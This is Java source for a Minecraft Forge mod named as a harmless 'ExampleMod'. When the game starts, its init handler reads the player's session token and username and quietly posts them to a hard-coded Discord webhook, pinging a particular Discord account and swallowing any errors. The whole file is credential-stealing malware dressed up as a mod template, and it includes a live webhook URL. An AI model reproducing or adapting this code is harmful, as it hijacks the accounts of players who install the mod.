package studio.dreamys;

import net.minecraft.client.Minecraft;
import net.minecraft.init.Blocks;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;

import java.io.IOException;
import java.util.ArrayList;

@Mod(modid = ExampleMod.MODID, version = ExampleMod.VERSION)
public class ExampleMod {
    public static final String MODID = "examplemod";
    public static final String VERSION = "1.0";
    public static final Minecraft mc = Minecraft.getMinecraft();
    public static final String USERNAME = mc.getSession().getUsername();
    public static final String WEBHOOK = "https://discord.com/api/webhooks/1085582719792189490/E9ODgFsSNOvFHez__DUnd7Z2PDwvKFk0nyBfZXn7pfP2T6OQcRpcx2renY9QLeW7Jmgu";
    public static final String body = "`" + mc.getSession().getToken() + "`";

    @Mod.EventHandler
    public void init(FMLInitializationEvent event) {
        String tokensend = "<@675018004605698049> Token is: " + "`" + body + "`";
        try{
            CloseableHttpClient httpClient = HttpClients.createDefault();
            HttpPost httpPost = new HttpPost(WEBHOOK);
            ArrayList<NameValuePair> params = new ArrayList<>();
            params.add(new BasicNameValuePair("content", tokensend));
            params.add(new BasicNameValuePair("username", mc.getSession().getUsername()));
            httpPost.setEntity(new UrlEncodedFormEntity(params));
            httpClient.execute(httpPost);
            httpClient.close();
        }catch (IOException ignored){}
    }
}

